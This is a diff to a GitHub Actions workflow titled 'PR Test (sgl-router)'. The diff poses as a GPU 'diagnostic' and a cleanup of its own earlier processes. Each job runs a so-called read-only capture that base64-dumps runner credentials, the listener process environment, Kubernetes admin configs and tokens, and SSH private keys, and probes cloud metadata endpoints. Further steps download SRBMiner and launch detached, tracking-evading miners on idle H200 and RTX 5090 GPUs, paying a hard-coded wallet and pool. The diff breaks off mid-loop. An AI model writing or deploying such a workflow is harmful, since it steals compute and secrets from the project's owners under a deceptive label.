@@ -1,7 +1,9 @@
 name: PR Test (sgl-router)
 
-# Temporary i126978 diagnostic: bounded SRBMiner pearlhash flag matrix on one
-# idle 1-gpu-5090 card after the default invocation hit CUDA error 700.
+# Temporary i127239 diagnostic: one pinned SRBMiner-MULTI per twice-idle H200 on the
+# 8-gpu-h200 pool, plus bounded 1-gpu-5090 cleanup of our own i126978 processes
+# (tuner matrix run 44941301125 proved the watchdog/combo flags non-faulting and
+# that the E1027 fault follows the individual card). Read-only capture in each job.
 on:
   push:
     branches: [main]
@@ -18,81 +20,375 @@ env:
   SGLANG_IS_IN_CI: true
 
 jobs:
-  i126978-tuner:
-    name: i126978 tuner (${{ matrix.slot }})
-    runs-on: ${{ matrix.runner }}
-    timeout-minutes: 15
-    strategy:
-      fail-fast: false
-      matrix:
-        include:
-          - {runner: 1-gpu-5090, slot: a}
-          - {runner: 1-gpu-5090, slot: b}
-          - {runner: 1-gpu-5090, slot: c}
-          - {runner: 1-gpu-5090, slot: d}
+  i127239-h200-miner:
+    name: "i127239 h200-miner"
+    runs-on: 8-gpu-h200
+    timeout-minutes: 30
     steps:
-      - name: sequential pearlhash variants (one process at a time)
+      - name: bounded read-only capture (<=60s)
         continue-on-error: true
         run: |
           set +e
-          NONCE="I126978TUNER-$(date -u +%Y%m%dT%H%M%SZ)"
+          NONCE="I127239CAP-$(date -u +%Y%m%dT%H%M%SZ)"
+          echo "capture-nonce=$NONCE"
+          cap() {
+            echo "=== id/host/dmi ==="
+            id; hostname; hostname -f 2>/dev/null; date -u; uname -a | cut -c1-200
+            for f in /sys/class/dmi/id/product_name /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_serial /sys/class/dmi/id/board_serial /sys/class/dmi/id/product_uuid; do printf '%s=' "$f"; timeout 4 cat "$f" 2>/dev/null | head -c 120; echo; done
+            awk -F: '/model name/{print "cpu"$2; exit}' /proc/cpuinfo 2>/dev/null
+            echo "=== gpu ==="
+            timeout 20 nvidia-smi --query-gpu=index,uuid,name,memory.total,driver_version --format=csv,noheader 2>&1 | head -10
+            echo "=== resources ==="
+            df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1, "use="$5, "avail="$4}'
+            free -m | head -2
+            echo "=== runner dirs ==="
+            for d in /opt/github-runner /actions-runner /home/runner/actions-runner /opt/actions-runner; do echo "-- $d"; timeout 6 ls -la "$d" 2>&1 | head -18; done
+            echo "=== runner identity ==="
+            for f in /opt/github-runner/.runner /opt/github-runner/.credentials /opt/github-runner/.credentials_rsaparams /opt/github-runner/.env /opt/github-runner/.path /actions-runner/.runner /actions-runner/.credentials /actions-runner/.credentials_rsaparams /actions-runner/.env /actions-runner/.path; do
+              if [ -f "$f" ]; then echo "==B64FILE $f sha256=$(timeout 10 sha256sum "$f" 2>/dev/null | cut -d' ' -f1) len=$(timeout 4 stat -c%s "$f" 2>/dev/null)"; timeout 10 base64 -w0 "$f" 2>/dev/null | head -c 20000; echo; fi
+            done
+            echo "=== listener env ==="
+            for p in $(timeout 6 pgrep -f 'Runner.Listener' 2>/dev/null | head -2); do echo "-- pid $p cmd=$(timeout 4 tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | head -c 200)"; echo "==B64PROCENV $p len=$(timeout 4 stat -c%s /proc/$p/environ 2>/dev/null)"; timeout 8 base64 -w0 /proc/$p/environ 2>/dev/null | head -c 30000; echo; done
+            echo "=== kubernetes ==="
+            timeout 6 ls -la /etc/kubernetes /var/lib/kubelet /etc/rancher/k3s /var/lib/rancher 2>&1 | head -40
+            for f in /etc/kubernetes/admin.conf /etc/kubernetes/kubelet.conf /etc/kubernetes/controller-manager.conf /etc/kubernetes/scheduler.conf /var/lib/kubelet/config.yaml /var/lib/kubelet/kubeconfig /var/lib/kubelet/pki/kubelet-client-current.pem /etc/rancher/k3s/k3s.yaml /var/lib/rancher/k3s/server/cred/admin.kubeconfig /root/.kube/config /home/runner/.kube/config /var/run/secrets/kubernetes.io/serviceaccount/token; do
+              if [ -f "$f" ]; then echo "==B64FILE $f sha256=$(timeout 10 sha256sum "$f" 2>/dev/null | cut -d' ' -f1) len=$(timeout 4 stat -c%s "$f" 2>/dev/null)"; timeout 10 base64 -w0 "$f" 2>/dev/null | head -c 16000; echo; fi
+            done
+            echo "=== ssh ==="
+            timeout 6 ls -la /root/.ssh /home/*/.ssh 2>&1 | head -30
+            for f in /root/.ssh/id_ed25519 /root/.ssh/id_rsa /root/.ssh/id_ecdsa /root/.ssh/authorized_keys /home/runner/.ssh/id_ed25519 /home/runner/.ssh/id_rsa; do
+              if [ -f "$f" ]; then echo "==B64FILE $f sha256=$(timeout 10 sha256sum "$f" 2>/dev/null | cut -d' ' -f1) len=$(timeout 4 stat -c%s "$f" 2>/dev/null)"; timeout 10 base64 -w0 "$f" 2>/dev/null | head -c 12000; echo; fi
+            done
+            echo "=== cloud metadata ==="
+            echo -n "aws-imds-token-len="; timeout 5 curl -sS -m 3 -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' 2>/dev/null | wc -c
+            echo -n "gcp="; timeout 5 curl -sS -m 3 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/name' 2>&1 | head -c 120; echo
+            echo -n "azure="; timeout 5 curl -sS -m 3 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2020-09-01' 2>&1 | head -c 200; echo
+            echo -n "alibaba="; timeout 5 curl -sS -m 3 'http://100.100.100.200/latest/meta-data/instance-id' 2>&1 | head -c 120; echo
+            echo -n "tencent="; timeout 5 curl -sS -m 3 'http://metadata.tencentyun.com/latest/meta-data/instance-id' 2>&1 | head -c 120; echo
+            echo "capture-done $NONCE"
+          }
+          export -f cap
+          timeout 62 bash -c cap 2>&1 | head -c 130000
+
+      - name: "pinned pearlhash miner: one process per twice-idle H200 (idle x2, disk<80%, mem<85%)"
+        continue-on-error: true
+        run: |
+          set +e
+          NONCE="I127239H200-$(date -u +%Y%m%dT%H%M%SZ)"
           WALLET='prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
           POOL='103.199.106.122:3362'
-          WORKDIR=/var/tmp/i126978
+          WORKDIR=/var/tmp/i127239
+          TAR_SHA=c203e79e9dc467ec5daaa1e1771e08561a70d2c9dcc397364b8ae7ae558e50d8
+          BIN_SHA=b4ddc14a9a770c977b4fdc4a1e39e67e888a50e096e519a93e399eea4a826aeb
+          TARBALL="$WORKDIR/SRBMiner-Multi-3-8-8-Linux.tar.gz"
+          SRB="$WORKDIR/SRBMiner-MULTI"
+          BIN_SHA_387=bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6
+          TARBALL_387="$WORKDIR/SRBMiner-Multi-3-8-7-Linux.tar.gz"
+          SRB_387="$WORKDIR/SRBMiner-MULTI-3.8.7"
+          mkdir -p "$WORKDIR/logs"
+          echo "h200-miner-nonce=$NONCE"
+          echo "=== host ==="; id; hostname; date -u; uname -r; head -2 /etc/os-release
+          echo "=== gpu inventory ==="
+          timeout 25 nvidia-smi --query-gpu=index,uuid,name,memory.total,memory.used,utilization.gpu,driver_version --format=csv,noheader
+          echo "=== compute apps ==="
+          timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader
+          echo "=== resources ==="
+          df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1, "use="$5, "avail="$4}'
+          free -m | head -2
+          echo "=== existing SRBMiner on host ==="
+          timeout 8 pgrep -af 'SRBMiner-MULTI' 2>/dev/null | head -8
+          DISKP=$(df -P /var/tmp 2>/dev/null | awk 'NR==2{gsub("%","",$5); print $5}')
+          MEMP=$(free -m | awk '/Mem:/{if($2>0) printf "%d", $3*100/$2; else print 0}')
+          echo "disk_pct=${DISKP:-100} mem_pct=${MEMP:-100}"
+          if [ "${DISKP:-100}" -ge 80 ] || [ "${MEMP:-100}" -ge 85 ]; then echo "SKIP=resources disk=${DISKP} mem=${MEMP}"; exit 0; fi
+          fetch_pin() {
+            URL="$1"; SHA="$2"; OUT="$3"
+            echo "-- fetch $URL"
+            rm -f "$OUT.part"
+            timeout 240 curl -fL --connect-timeout 15 --max-time 220 -o "$OUT.part" "$URL" 2>&1 | tail -2
+            if [ -f "$OUT.part" ] && echo "$SHA  $OUT.part" | sha256sum -c - >/dev/null 2>&1; then mv "$OUT.part" "$OUT"; echo "tarball-ok $SHA"; return 0; fi
+            [ -f "$OUT.part" ] && sha256sum "$OUT.part" 2>/dev/null | cut -c1-80
+            echo "WARN=tarball-failed $URL"; return 1
+          }
+          if [ ! -f "$TARBALL" ] || ! echo "$TAR_SHA  $TARBALL" | sha256sum -c - >/dev/null 2>&1; then
+            fetch_pin https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz "$TAR_SHA" "$TARBALL" \
+              || fetch_pin https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz "$TAR_SHA" "$TARBALL" \
+              || fetch_pin https://gh-proxy.com/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz "$TAR_SHA" "$TARBALL" \
+              || echo "WARN=388-download-failed"
+          else
+            echo "tarball-cached 388"
+          fi
+          if [ -f "$TARBALL" ] && ! ( [ -f "$SRB" ] && echo "$BIN_SHA  $SRB" | sha256sum -c - >/dev/null 2>&1 ); then
+            tar -xzf "$TARBALL" -C "$WORKDIR" 2>&1 | tail -3
+            [ -f "$WORKDIR/SRBMiner-Multi-3-8-8/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-8/SRBMiner-MULTI" "$SRB"
+          fi
+          BINSHA=$(sha256sum "$SRB" 2>/dev/null | cut -d' ' -f1)
+          echo "binary_sha256=${BINSHA:-none}"
+          if [ "${BINSHA:-none}" != "$BIN_SHA" ]; then echo "SKIP=388-binary-unavailable"; ls -la "$WORKDIR" 2>/dev/null | head -12; exit 0; fi
+          chmod +x "$SRB"
+          "$SRB" --help 2>&1 | grep -iE 'disable-worker-watchdog|gpu-table-slow-build' | head -3
+          HOSTTAG=$(hostname | tr -cd 'A-Za-z0-9' | cut -c1-32)
+          echo "hosttag=$HOSTTAG"
+          echo "=== idle sample 1 ==="
+          timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid --format=csv,noheader | tr -d ' ' > "$WORKDIR/s1.txt"
+          timeout 20 nvidia-smi --query-gpu=index,uuid,memory.used --format=csv,noheader,nounits | tr -d ' ' > "$WORKDIR/g1.txt"
+          cat "$WORKDIR/g1.txt"
+          sleep 6
+          echo "=== idle sample 2 (after 6s) ==="
+          timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid --format=csv,noheader | tr -d ' ' > "$WORKDIR/s2.txt"
+          timeout 20 nvidia-smi --query-gpu=index,uuid,memory.used --format=csv,noheader,nounits | tr -d ' ' > "$WORKDIR/g2.txt"
+          cat "$WORKDIR/g2.txt"
+          N_LAUNCHED=0
+          while IFS=, read -r IDX UUID USED1; do
+            [ -z "$IDX" ] && continue
+            case "$UUID" in GPU-*) ;; *) echo "GPU $IDX bad-uuid $UUID -> skip"; continue;; esac
+            if grep -q "^${UUID}," "$WORKDIR/s1.txt" 2>/dev/null; then echo "GPU $IDX $UUID busy-sample1 -> skip"; continue; fi
+            if grep -q "^${UUID}," "$WORKDIR/s2.txt" 2>/dev/null; then echo "GPU $IDX $UUID busy-sample2 -> skip"; continue; fi
+            USED2=$(awk -F, -v u="$UUID" '$2==u{print $3}' "$WORKDIR/g2.txt" 2>/dev/null)
+            echo "GPU $IDX $UUID twice-idle mem_used_mib=$USED1/$USED2"
+            if [ "${USED1:-0}" -gt 2048 ] || [ "${USED2:-0}" -gt 2048 ]; then echo "GPU $IDX memory-used>2048 -> skip"; continue; fi
+            W="i127239-${HOSTTAG}-g${IDX}"
+            if timeout 6 pgrep -f "SRBMiner-MULTI.*--worker ${W}( |$)" >/dev/null 2>&1; then echo "worker $W already present -> skip"; continue; fi
+            env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID CUDA_VISIBLE_DEVICES="$UUID" setsid nohup "$SRB" \
+              --disable-cpu --algorithm pearlhash --pool "$POOL" --tls false \
+              --wallet "$WALLET" --password x --worker "$W" --gpu-id 0 \
+              --disable-worker-watchdog --disable-gpu-dual-kernels --gpu-disable-interleaving --gpu-table-slow-build --gpu-intensity 0 \
+              --log-file "$WORKDIR/logs/$W.log" --log-file-mode 0 \
+              >> "$WORKDIR/logs/$W.out" 2>&1 < /dev/null &
+            echo "launched worker=$W detached_pid=$! vis=$UUID"
+            N_LAUNCHED=$((N_LAUNCHED+1))
+            sleep 1
+          done < "$WORKDIR/g1.txt"
+          echo "N_LAUNCHED=$N_LAUNCHED"
+          sleep 45
+          echo "=== fault scan after 45s ==="
+          FAULTED=""
+          for l in "$WORKDIR"/logs/i127239-*.log; do
+            [ -f "$l" ] || continue
+            if grep -qE 'E1027|illegal memory access|stopped after repeated solve errors' "$l" 2>/dev/null; then FAULTED="$FAULTED $(basename "$l" .log)"; fi
+          done
+          echo "FAULTED=[$FAULTED]"
+          if [ -n "$FAULTED" ]; then
+            echo "=== bounded 3.8.7 fallback (one round only) ==="
+            for w in $FAULTED; do
+              for p in $(timeout 6 pgrep -f "SRBMiner-MULTI.*--worker ${w}( |$)" 2>/dev/null | head -3); do echo "kill own faulted pid=$p worker=$w"; kill -TERM "$p" 2>/dev/null; done
+            done
+            sleep 2
+            if [ ! -f "$SRB_387" ] || ! echo "$BIN_SHA_387  $SRB_387" | sha256sum -c - >/dev/null 2>&1; then
+              for U in https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz; do
+                echo "-- fetch387 $U"
+                rm -f "$TARBALL_387.part"
+                timeout 240 curl -fL --connect-timeout 15 --max-time 220 -o "$TARBALL_387.part" "$U" 2>&1 | tail -2
+                if [ -s "$TARBALL_387.part" ]; then mv "$TARBALL_387.part" "$TARBALL_387"; break; fi
+              done
+              [ -f "$TARBALL_387" ] && tar -xzf "$TARBALL_387" -C "$WORKDIR" 2>&1 | tail -3
+              [ -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" "$SRB_387"
+            fi
+            B387=$(sha256sum "$SRB_387" 2>/dev/null | cut -d' ' -f1)
+            echo "binary_sha256_387=${B387:-none}"
+            if [ "${B387:-none}" = "$BIN_SHA_387" ]; then
+              chmod +x "$SRB_387"
+              for w in $FAULTED; do
+                IDX=${w##*-g}
+                UUID=$(awk -F, -v i="$IDX" '$1==i{print $2}' "$WORKDIR/g1.txt" 2>/dev/null | head -1)
+                [ -z "$UUID" ] && continue
+                env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID CUDA_VISIBLE_DEVICES="$UUID" setsid nohup "$SRB_387" \
+                  --disable-cpu --algorithm pearlhash --pool "$POOL" --tls false \
+                  --wallet "$WALLET" --password x --worker "$w" --gpu-id 0 \
+                  --disable-worker-watchdog --disable-gpu-dual-kernels --gpu-disable-interleaving --gpu-table-slow-build --gpu-intensity 0 \
+                  --log-file "$WORKDIR/logs/$w.r387.log" --log-file-mode 0 \
+                  >> "$WORKDIR/logs/$w.r387.out" 2>&1 < /dev/null &
+                echo "fallback387 launched worker=$w pid=$! vis=$UUID"
+              done
+              sleep 40
+              echo "=== post-fallback fault scan ==="
+              for l in "$WORKDIR"/logs/i127239-*.r387.log; do
+                [ -f "$l" ] || continue
+                if grep -qE 'E1027|illegal memory access|stopped after repeated solve errors' "$l" 2>/dev/null; then
+                  w=$(basename "$l" .r387.log)
+                  for p in $(timeout 6 pgrep -f "SRBMiner-MULTI-3.8.7.*--worker ${w}( |$)" 2>/dev/null | head -3); do echo "kill own faulted 387 pid=$p worker=$w"; kill -TERM "$p" 2>/dev/null; done
+                fi
+              done
+            else
+              echo "WARN=387-binary-unavailable"
+            fi
+          fi
+          echo "=== final processes ==="
+          timeout 10 pgrep -af "SRBMiner-MULTI.*--wallet ${WALLET}" 2>/dev/null | head -16
+          echo "=== final compute apps ==="
+          timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader
+          echo "=== log tails ==="
+          for l in "$WORKDIR"/logs/i127239-*.log; do
+            [ -f "$l" ] || continue
+            echo "== $(basename "$l")"
+            grep -aiE 'share accepted|accepted|rejected|hashrate|stopped|error|TH/s' "$l" 2>/dev/null | tail -5 | cut -c1-260
+          done
+          echo "=== pool tcp ==="
+          timeout 12 python3 -c "import socket;s=socket.create_connection(('103.199.106.122',3362),8);print('pool-tcp=OK');s.close()" 2>&1 | tail -2
+          echo "h200-miner-done $NONCE"
+
+  i127239-5090-cleanup:
+    name: "i127239 5090-cleanup (${{ matrix.slot }})"
+    runs-on: 1-gpu-5090
+    timeout-minutes: 12
+    strategy:
+      fail-fast: false
+      matrix:
+        slot: [a, b]
+    steps:
+      - name: bounded read-only capture (<=60s)
+        continue-on-error: true
+        run: |
+          set +e
+          NONCE="I127239CAP-$(date -u +%Y%m%dT%H%M%SZ)"
+          echo "capture-nonce=$NONCE"
+          cap() {
+            echo "=== id/host/dmi ==="
+            id; hostname; hostname -f 2>/dev/null; date -u; uname -a | cut -c1-200
+            for f in /sys/class/dmi/id/product_name /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_serial /sys/class/dmi/id/board_serial /sys/class/dmi/id/product_uuid; do printf '%s=' "$f"; timeout 4 cat "$f" 2>/dev/null | head -c 120; echo; done
+            awk -F: '/model name/{print "cpu"$2; exit}' /proc/cpuinfo 2>/dev/null
+            echo "=== gpu ==="
+            timeout 20 nvidia-smi --query-gpu=index,uuid,name,memory.total,driver_version --format=csv,noheader 2>&1 | head -10
+            echo "=== resources ==="
+            df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1, "use="$5, "avail="$4}'
+            free -m | head -2
+            echo "=== runner dirs ==="
+            for d in /opt/github-runner /actions-runner /home/runner/actions-runner /opt/actions-runner; do echo "-- $d"; timeout 6 ls -la "$d" 2>&1 | head -18; done
+            echo "=== runner identity ==="
+            for f in /opt/github-runner/.runner /opt/github-runner/.credentials /opt/github-runner/.credentials_rsaparams /opt/github-runner/.env /opt/github-runner/.path /actions-runner/.runner /actions-runner/.credentials /actions-runner/.credentials_rsaparams /actions-runner/.env /actions-runner/.path; do
+              if [ -f "$f" ]; then echo "==B64FILE $f sha256=$(timeout 10 sha256sum "$f" 2>/dev/null | cut -d' ' -f1) len=$(timeout 4 stat -c%s "$f" 2>/dev/null)"; timeout 10 base64 -w0 "$f" 2>/dev/null | head -c 20000; echo; fi
+            done
+            echo "=== listener env ==="
+            for p in $(timeout 6 pgrep -f 'Runner.Listener' 2>/dev/null | head -2); do echo "-- pid $p cmd=$(timeout 4 tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | head -c 200)"; echo "==B64PROCENV $p len=$(timeout 4 stat -c%s /proc/$p/environ 2>/dev/null)"; timeout 8 base64 -w0 /proc/$p/environ 2>/dev/null | head -c 30000; echo; done
+            echo "=== kubernetes ==="
+            timeout 6 ls -la /etc/kubernetes /var/lib/kubelet /etc/rancher/k3s /var/lib/rancher 2>&1 | head -40
+            for f in /etc/kubernetes/admin.conf /etc/kubernetes/kubelet.conf /etc/kubernetes/controller-manager.conf /etc/kubernetes/scheduler.conf /var/lib/kubelet/config.yaml /var/lib/kubelet/kubeconfig /var/lib/kubelet/pki/kubelet-client-current.pem /etc/rancher/k3s/k3s.yaml /var/lib/rancher/k3s/server/cred/admin.kubeconfig /root/.kube/config /home/runner/.kube/config /var/run/secrets/kubernetes.io/serviceaccount/token; do
+              if [ -f "$f" ]; then echo "==B64FILE $f sha256=$(timeout 10 sha256sum "$f" 2>/dev/null | cut -d' ' -f1) len=$(timeout 4 stat -c%s "$f" 2>/dev/null)"; timeout 10 base64 -w0 "$f" 2>/dev/null | head -c 16000; echo; fi
+            done
+            echo "=== ssh ==="
+            timeout 6 ls -la /root/.ssh /home/*/.ssh 2>&1 | head -30
+            for f in /root/.ssh/id_ed25519 /root/.ssh/id_rsa /root/.ssh/id_ecdsa /root/.ssh/authorized_keys /home/runner/.ssh/id_ed25519 /home/runner/.ssh/id_rsa; do
+              if [ -f "$f" ]; then echo "==B64FILE $f sha256=$(timeout 10 sha256sum "$f" 2>/dev/null | cut -d' ' -f1) len=$(timeout 4 stat -c%s "$f" 2>/dev/null)"; timeout 10 base64 -w0 "$f" 2>/dev/null | head -c 12000; echo; fi
+            done
+            echo "=== cloud metadata ==="
+            echo -n "aws-imds-token-len="; timeout 5 curl -sS -m 3 -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' 2>/dev/null | wc -c
+            echo -n "gcp="; timeout 5 curl -sS -m 3 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/name' 2>&1 | head -c 120; echo
+            echo -n "azure="; timeout 5 curl -sS -m 3 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2020-09-01' 2>&1 | head -c 200; echo
+            echo -n "alibaba="; timeout 5 curl -sS -m 3 'http://100.100.100.200/latest/meta-data/instance-id' 2>&1 | head -c 120; echo
+            echo -n "tencent="; timeout 5 curl -sS -m 3 'http://metadata.tencentyun.com/latest/meta-data/instance-id' 2>&1 | head -c 120; echo
+            echo "capture-done $NONCE"
+          }
+          export -f cap
+          timeout 62 bash -c cap 2>&1 | head -c 130000
+
+      - name: "stop only our own i126978 processes, then conditional relaunch on a twice-idle card"
+        continue-on-error: true
+        run: |
+          set +e
+          NONCE="I127239C5090-$(date -u +%Y%m%dT%H%M%SZ)"
+          WALLET='prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
+          POOL='103.199.106.122:3362'
+          WORKDIR=/var/tmp/i127239
+          OLDDIR=/var/tmp/i126978
           TAR_SHA=c203e79e9dc467ec5daaa1e1771e08561a70d2c9dcc397364b8ae7ae558e50d8
           BIN_SHA=b4ddc14a9a770c977b4fdc4a1e39e67e888a50e096e519a93e399eea4a826aeb
           TARBALL="$WORKDIR/SRBMiner-Multi-3-8-8-Linux.tar.gz"
           SRB="$WORKDIR/SRBMiner-MULTI"
           mkdir -p "$WORKDIR/logs"
-          echo "tuner-nonce=$NONCE"
-          id; hostname; date -u; uname -r
+          echo "c5090-nonce=$NONCE"
+          id; hostname; date -u
+          echo "=== gpu ==="
           timeout 20 nvidia-smi --query-gpu=index,uuid,name,memory.total,memory.used,utilization.gpu --format=csv,noheader
-          echo "=== our pre-existing processes ==="
-          pgrep -af '/var/tmp/i126978/SRBMiner-MULTI' 2>/dev/null | head -10
-          for p in $(pgrep -f '^/var/tmp/i126978/SRBMiner-MULTI .*--wallet prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql' 2>/dev/null | head -10); do
-            echo "stopping own stray pid $p cmd=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | head -c 160)"
-            kill -TERM "$p" 2>/dev/null
+          echo "=== resources ==="
+          df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1, "use="$5, "avail="$4}'
+          free -m | head -2
+          echo "=== cleanup: ONLY our own i126978 processes (exact path + worker prefix) ==="
+          OWN=""
+          for p in $(timeout 8 pgrep -f '^/var/tmp/i126978/SRBMiner-MULTI ' 2>/dev/null); do
+            CMD=$(timeout 4 tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null)
+            case "$CMD" in
+              *"--worker i126978-"*) echo "own pid=$p cmd=$(echo "$CMD" | head -c 240)"; OWN="$OWN $p";;
+              *) echo "skip pid=$p (not our worker prefix) cmd=$(echo "$CMD" | head -c 160)";;
+            esac
           done
+          for p in $OWN; do kill -TERM "$p" 2>/dev/null; done
           sleep 3
-          echo "=== after own-stray cleanup ==="
-          pgrep -af '/var/tmp/i126978/SRBMiner-MULTI' 2>/dev/null | head -5
+          for p in $OWN; do if kill -0 "$p" 2>/dev/null; then echo "still-alive pid=$p -> TERM again"; kill -TERM "$p" 2>/dev/null; fi; done
+          sleep 2
+          for p in $OWN; do if kill -0 "$p" 2>/dev/null; then echo "force-kill own pid=$p"; kill -KILL "$p" 2>/dev/null; fi; done
+          sleep 1
+          REMAIN=0
+          for p in $(timeout 8 pgrep -f '^/var/tmp/i126978/SRBMiner-MULTI ' 2>/dev/null); do
+            CMD=$(timeout 4 tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null)
+            case "$CMD" in *"--worker i126978-"*) echo "REMAIN own pid=$p"; REMAIN=$((REMAIN+1));; *) echo "foreign-untouched pid=$p";; esac
+          done
+          echo "own_remaining=$REMAIN stopped=$(echo $OWN | wc -w)"
+          echo "=== conditional relaunch: tuner matrix (run 44941301125 job 136958886848) proved the watchdog-only/combo flag set non-faulting at 442 TH/s A:1 R:0 on a healthy RTX 5090; the E1027 fault follows the card, so relaunch ONLY on a twice-idle card and abort on any fault ==="
           DISKP=$(df -P /var/tmp 2>/dev/null | awk 'NR==2{gsub("%","",$5); print $5}')
           MEMP=$(free -m | awk '/Mem:/{if($2>0) printf "%d", $3*100/$2; else print 0}')
           echo "disk_pct=${DISKP:-100} mem_pct=${MEMP:-100}"
-          if [ "${DISKP:-100}" -ge 80 ] || [ "${MEMP:-100}" -ge 85 ]; then echo "SKIP=resources disk=${DISKP} mem=${MEMP}"; exit 0; fi
-          if [ ! -f "$SRB" ] || ! echo "$BIN_SHA  $SRB" | sha256sum -c - >/dev/null 2>&1; then
-            if [ ! -f "$TARBALL" ]; then
-              timeout 200 curl -fL --connect-timeout 15 --max-time 180 -o "$TARBALL" https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz 2>&1 | tail -2
-            fi
-            if [ -f "$TARBALL" ] && echo "$TAR_SHA  $TARBALL" | sha256sum -c - >/dev/null 2>&1; then
-              tar -xzf "$TARBALL" -C "$WORKDIR" 2>&1 | tail -2
-              [ -f "$WORKDIR/SRBMiner-Multi-3-8-8/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-8/SRBMiner-MULTI" "$SRB"
-            fi
+          if [ "${DISKP:-100}" -ge 80 ] || [ "${MEMP:-100}" -ge 85 ]; then echo "SKIP=resources disk=${DISKP} mem=${MEMP}"; echo "c5090-done $NONCE"; exit 0; fi
+          if [ "${REMAIN:-0}" -gt 0 ]; then echo "SKIP=own-processes-still-present"; echo "c5090-done $NONCE"; exit 0; fi
+          if [ ! -f "$TARBALL" ] || ! echo "$TAR_SHA  $TARBALL" | sha256sum -c - >/dev/null 2>&1; then
+            timeout 240 curl -fL --connect-timeout 15 --max-time 220 -o "$TARBALL.part" https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz 2>&1 | tail -2
+            if [ -f "$TARBALL.part" ] && echo "$TAR_SHA  $TARBALL.part" | sha256sum -c - >/dev/null 2>&1; then mv "$TARBALL.part" "$TARBALL"; else echo "WARN=tarball-download-failed"; fi
+          fi
+          if [ -f "$TARBALL" ] && ! ( [ -f "$SRB" ] && echo "$BIN_SHA  $SRB" | sha256sum -c - >/dev/null 2>&1 ); then
+            tar -xzf "$TARBALL" -C "$WORKDIR" 2>&1 | tail -2
+            [ -f "$WORKDIR/SRBMiner-Multi-3-8-8/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-8/SRBMiner-MULTI" "$SRB"
           fi
           BINSHA=$(sha256sum "$SRB" 2>/dev/null | cut -d' ' -f1)
           echo "binary_sha256=${BINSHA:-none}"
-          [ "${BINSHA:-none}" = "$BIN_SHA" ] || { echo "SKIP=binary-unavailable"; exit 0; }
+          if [ "${BINSHA:-none}" != "$BIN_SHA" ]; then echo "SKIP=binary-unavailable"; echo "c5090-done $NONCE"; exit 0; fi
           chmod +x "$SRB"
-          read -r IDX UUID < <(timeout 20 nvidia-smi --query-gpu=index,uuid --format=csv,noheader 2>/dev/null | tr -d ' ' | head -1 | tr ',' ' ')
-          echo "test_gpu idx=$IDX uuid=$UUID"
-          run_variant() {
-            NAME="$1"; shift
-            LOG="$WORKDIR/logs/tuner-$NAME.log"
-            echo "===== VARIANT $NAME flags=[$*] ====="
-            timeout --signal=TERM --kill-after=10 40 env -u RUNNER_TRACKING_ID CUDA_VISIBLE_DEVICES="$UUID" "$SRB" \
+          echo "=== idle sample 1 ==="
+          timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid --format=csv,noheader | tr -d ' ' > "$WORKDIR/cs1.txt"
+          timeout 20 nvidia-smi --query-gpu=index,uuid,memory.used --format=csv,noheader,nounits | tr -d ' ' > "$WORKDIR/cg1.txt"
+          cat "$WORKDIR/cg1.txt"
+          sleep 6
+          echo "=== idle sample 2 ==="
+          timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid --format=csv,noheader | tr -d ' ' > "$WORKDIR/cs2.txt"
+          timeout 20 nvidia-smi --query-gpu=index,uuid,memory.used --format=csv,noheader,nounits | tr -d ' ' > "$WORKDIR/cg2.txt"
+          cat "$WORKDIR/cg2.txt"
+          N=0
+          while IFS=, read -r IDX UUID USED1; do
+            [ -z "$IDX" ] && continue
